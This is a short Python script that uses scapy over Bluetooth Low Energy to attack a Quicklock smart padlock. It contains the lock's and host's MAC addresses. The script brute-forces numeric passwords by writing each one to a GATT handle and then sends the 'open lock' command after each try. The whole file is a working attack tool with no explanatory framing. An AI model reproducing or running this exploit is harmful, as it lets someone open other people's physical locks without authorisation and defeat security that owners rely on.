#!/bin/python

# Unlock Quicklock Padlock using scapy
# Quicklock 	C4:BE:84:02:76:3B
# Host 		98:58:8A:05:09:45
# 
#	conn_interval_min = "4800"
#	conn_interval_max = "5800"
import time
from scapy.all import *
from BTLE import *

def main():
	s = bindsock()
	rand = "00"
	Connect(s, "3B760284BEC4",rand)

	for i in range(1,100):
	   a=('{:d}'.format(i).zfill(10))
	   a+='00000000'
	   password=('{:s}'.format(a).zfill(18))
	   #print(password)
	   #raw = bytearray.fromhex(password)
	   #print(raw + '\n')
	   writereq(s, "2d00", password)

	   # write request -handle 0x0037 -data 01 (Open Lock)
	   writereq(s, "3700","01")

	time.sleep(5)
	disconnect(s)

if __name__ == "__main__":
    main()